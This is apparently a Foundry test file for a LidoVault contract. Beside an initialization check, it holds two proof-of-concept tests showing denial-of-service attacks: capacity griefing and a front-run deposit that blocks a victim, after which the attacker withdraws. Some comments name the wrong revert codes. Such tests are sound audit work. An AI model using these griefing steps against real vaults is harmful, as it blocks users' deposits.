// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/contracts/LidoVault.sol";
import "../src/contracts/interfaces/ILido.sol";
import "../src/contracts/interfaces/ILidoWithdrawalQueueERC721.sol";
import {ILidoVaultInitializer} from "../src/contracts/interfaces/ILidoVaultInitializer.sol";
import {MockLido} from "../src/contracts/mocks/MockLido.sol";
import {MockLidoWithdrawalQueue} from "../src/contracts/mocks/MockLidoWithdrawalQueue.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract LidoVaultTest is Test {
    LidoVault public lidoVault;
    ILido public lido;
    ILidoWithdrawalQueueERC721 public withdrawalQueue;
    IERC20 public stETH;

    address public constant LIDO_ADDRESS =
        0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address public constant WITHDRAWAL_QUEUE_ADDRESS =
        0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1;

    address public owner;
    address public user1;
    address public user2;

    uint256 public constant DURATION = 30 days;
    uint256 public constant FIXED_CAPACITY = 100 ether;
    uint256 public constant VARIABLE_CAPACITY = 50 ether;
    uint256 public constant PROTOCOL_FEE_BPS = 100; // 1%
    uint256 public constant EARLY_EXIT_FEE_BPS = 1000; // 10%

    function setUp() public {
        owner = makeAddr("owner");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");

        MockLido mockLido = new MockLido();
        MockLidoWithdrawalQueue mockWithdrawalQueue = new MockLidoWithdrawalQueue();
        vm.etch(LIDO_ADDRESS, address(mockLido).code);
        vm.etch(WITHDRAWAL_QUEUE_ADDRESS, address(mockWithdrawalQueue).code);

        MockLido(payable(LIDO_ADDRESS)).initialize();
        MockLidoWithdrawalQueue(payable(WITHDRAWAL_QUEUE_ADDRESS)).initialize(
            address(mockLido)
        );

        lidoVault = new LidoVault(false);

        ILidoVaultInitializer.InitializationParams
            memory initializeParams = ILidoVaultInitializer
                .InitializationParams({
                    vaultId: 1,
                    duration: DURATION,
                    fixedSideCapacity: FIXED_CAPACITY,
                    variableSideCapacity: VARIABLE_CAPACITY,
                    earlyExitFeeBps: EARLY_EXIT_FEE_BPS,
                    protocolFeeBps: PROTOCOL_FEE_BPS,
                    protocolFeeReceiver: owner
                });

        lidoVault.initialize(initializeParams);
    }

    function testInitialization() public {
        assertEq(lidoVault.duration(), DURATION);
        assertEq(lidoVault.fixedSideCapacity(), FIXED_CAPACITY);
        assertEq(lidoVault.variableSideCapacity(), VARIABLE_CAPACITY);
        assertEq(lidoVault.protocolFeeBps(), PROTOCOL_FEE_BPS);
        assertEq(lidoVault.protocolFeeReceiver(), owner);
        assertEq(lidoVault.earlyExitFeeBps(), EARLY_EXIT_FEE_BPS);
    }

    function testDosAttackOnVaultInit() public {
        // Attacker deposits to leave remainingCapacity just below minimumDepositAmount
        vm.deal(user2, 101 ether);
        vm.prank(user2);
        lidoVault.deposit{value: FIXED_CAPACITY}(0);

        vm.deal(user1, 50 ether);
        uint256 attackerDepositAmount = 49.99 ether - 1 wei;
        vm.prank(user1);
        lidoVault.deposit{value: attackerDepositAmount}(1); // 1 for VARIABLE side

        // Verify the remaining capacity
        uint256 remainingCapacity = VARIABLE_CAPACITY - attackerDepositAmount;
        assertEq(remainingCapacity, 0.01 ether + 1 wei);

        // Normal user tries to deposit the minimum amount, which should fail
        vm.deal(user2, 0.01 ether);
        vm.startPrank(user2);
        vm.expectRevert(bytes("RC")); // Expect revert with "OED" (Over Existing Deposits) error
        lidoVault.deposit{value: 0.01 ether}(1); // 1 for VARIABLE side
        vm.stopPrank();

        //lidoVault.deposit{value: remainingCapacity}(1);
    }

    function testDdosSandwichAttack() public {
        // vault has been initialized with 100eth fixed part and 50 eth varaible part
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        uint256 minimumDepositAmount = 0.01 ether; // Minimum deposit is 0.01 ETH

        // Victim attempts to deposit
        uint256 victimDeposit = 0.02 ether;
        vm.deal(victim, victimDeposit);

        // Front-run: Attacker deposits just enough to leave less than minimum deposit amount
        uint256 attackerDeposit = VARIABLE_CAPACITY - victimDeposit + 1 wei;
        vm.deal(attacker, attackerDeposit);
        vm.prank(attacker);
        lidoVault.deposit{value: attackerDeposit}(1); // Variable side

        // Victim's transaction should now revert
        vm.prank(victim);
        vm.expectRevert(bytes("OED")); // Remaining Capacity error
        lidoVault.deposit{value: victimDeposit}(1);

        // Attacker withdraws their variable part
        vm.prank(attacker);
        lidoVault.withdraw(1); // 1 for VARIABLE side

        // Assert that the attacker has successfully withdrawn
        assertEq(lidoVault.variableBearerToken(attacker), 0);
        assertEq(address(attacker).balance, attackerDeposit);

        // Assert that the vault has not started and victim couldn't deposit
        assertEq(lidoVault.isStarted(), false);
        assertEq(lidoVault.variableBearerToken(victim), 0);
    }
}
